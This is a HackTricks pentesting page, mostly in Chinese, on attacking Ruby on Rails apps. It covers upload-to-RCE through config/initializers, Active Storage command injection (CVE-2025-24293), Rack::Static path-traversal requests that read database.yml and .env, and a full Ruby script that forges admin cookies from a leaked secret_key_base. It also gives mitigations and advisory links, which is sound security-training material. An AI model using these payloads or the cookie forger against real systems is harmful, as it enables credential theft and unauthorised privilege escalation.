# Ruby Tricks

{{#include ../../banners/hacktricks-training.md}}

## File upload to RCE

如 [this article](https://www.offsec.com/blog/cve-2024-46986/) 所述，将 `.rb` 文件上传到诸如 `config/initializers/` 的敏感目录可能导致 Ruby on Rails 应用发生远程代码执行 (RCE)。

提示：
- 其他在应用启动时执行的 boot/eager-load 位置在可写时也存在风险（例如，`config/initializers/` 是经典位置）。如果你发现任意文件上传落到 `config/` 下的任意位置并随后被评估/require，可能会在启动时获得 RCE。
- 寻找将用户控制的文件复制到容器镜像中并在 Rails 启动时加载的 dev/staging 构建。

## Active Storage image transformation → command execution (CVE-2025-24293)

当应用使用 Active Storage 且同时使用 `image_processing` + `mini_magick`，并将不受信任的参数传递给图像转换方法时，Rails 7.1.5.2 之前 / 7.2.2.2 之前 / 8.0.2.1 之前的版本可能允许命令注入，因为某些转换方法被错误地默认允许。

- A vulnerable pattern looks like:
```erb
<%= image_tag blob.variant(params[:t] => params[:v]) %>
```
where `params[:t]` and/or `params[:v]` are attacker-controlled.

- 测试时可尝试
- 识别任何接受 variant/processing 选项、转换名称或任意 ImageMagick 参数的端点。
- 对 `params[:t]` 和 `params[:v]` 进行模糊测试，观察可疑错误或执行副作用。如果你能影响方法名或传递原始参数到 MiniMagick，可能在图像处理主机上获得代码执行。
- 如果你只有对生成的 variants 的只读访问，尝试通过精心构造的 ImageMagick 操作进行盲提取。

- 修复/检测
- 如果你看到 Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 并且同时使用 Active Storage + `image_processing` + `mini_magick` 且存在用户可控的转换，则应视为可利用。建议升级并对方法/参数实施严格白名单以及强化的 ImageMagick 策略。

## Rack::Static LFI / path traversal (CVE-2025-27610)

如果目标栈直接或通过框架使用 Rack middleware，`rack` 在 2.2.13、3.0.14、3.1.12 之前的版本在 `:root` 未设置/配置错误时允许通过 `Rack::Static` 进行本地文件包含。`PATH_INFO` 中的编码遍历可以暴露进程工作目录或意外的根目录下的文件。

- 搜索在 `config.ru` 或 middleware 栈中挂载 `Rack::Static` 的应用。对静态路径尝试编码遍历，例如：
```text
GET /assets/%2e%2e/%2e%2e/config/database.yml
GET /favicon.ico/..%2f..%2f.env
```
调整前缀以匹配配置的 `urls:`。如果应用返回文件内容，说明你很可能对已解析的 `:root` 下的任何内容具有 LFI。

- 缓解：升级 Rack；确保 `:root` 仅指向公共文件目录并显式设置。

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails 使用从 `secret_key_base` 派生的密钥对 cookies 进行加密和签名。如果该值 leaked（例如，在仓库、日志或配置错误的凭证中），通常可以解密、修改并重新加密 cookies。这通常会导致如果应用将角色、用户 ID 或功能标志存储在 cookies 中的授权绕过。

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
注意：
- 较旧的应用可能使用 AES-256-CBC 并以 `encrypted cookie` / `signed encrypted cookie` 作为 salts，或使用 JSON/Marshal 序列化器。请相应地调整 salts、cipher 和 serializer。
- 在被攻破/评估时，轮换 `secret_key_base` 以使所有现有 cookies 失效。

## 另请参阅（Ruby/Rails 特定漏洞）

- Ruby 反序列化与类污染：
{{#ref}}
../../pentesting-web/deserialization/README.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-class-pollution.md
{{#endref}}
{{#ref}}
../../pentesting-web/deserialization/ruby-_json-pollution.md
{{#endref}}
- Ruby 引擎中的模板注入（ERB/Haml/Slim 等）：
{{#ref}}
../../pentesting-web/ssti-server-side-template-injection/README.md
{{#endref}}



## 参考资料

- Rails 安全公告：CVE-2025-24293 Active Storage 不安全的转换方法（已在 7.1.5.2 / 7.2.2.2 / 8.0.2.1 修复）。 https://discuss.rubyonrails.org/t/cve-2025-24293-active-storage-allowed-transformation-methods-potentially-unsafe/89670
- GitHub Advisory: Rack::Static 本地文件包含 (CVE-2025-27610). https://github.com/advisories/GHSA-7wqh-767x-r66v
{{#include ../../banners/hacktricks-training.md}}
